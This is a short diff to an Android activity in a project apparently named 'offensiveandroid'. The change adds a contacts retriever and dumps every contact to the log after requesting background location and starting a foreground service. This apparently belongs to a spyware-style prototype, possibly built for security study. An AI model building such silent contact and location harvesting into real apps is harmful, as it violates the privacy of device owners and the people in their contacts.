@@ -3,12 +3,12 @@ package com.example.offensiveandroid
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.location.LocationRequest
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
 import android.widget.Toast
 import androidx.core.app.ActivityCompat
+import com.example.offensiveandroid.ui.theme.ContactsRetriever
 import com.google.android.gms.common.api.ResolvableApiException
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.LocationSettingsRequest
@@ -17,7 +17,7 @@ import com.google.android.gms.location.Priority
 
 class MainActivity : AppCompatActivity() {
 
-
+    private lateinit var contacts: ContactsRetriever
     companion object {
         const val REQUEST_LOCATION_SETTINGS = 1001
         const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
@@ -29,6 +29,7 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        contacts = ContactsRetriever(this)
 
         checkAndRequestPermissions()
         val serviceIntent = Intent(this, MyForegroundService::class.java)
@@ -83,7 +84,7 @@ class MainActivity : AppCompatActivity() {
             )
         } else {
             checkBackgroundLocationPermission()
-
+            Log.e("Contacts",contacts.getAllContacts().toString())
         }
     }
 
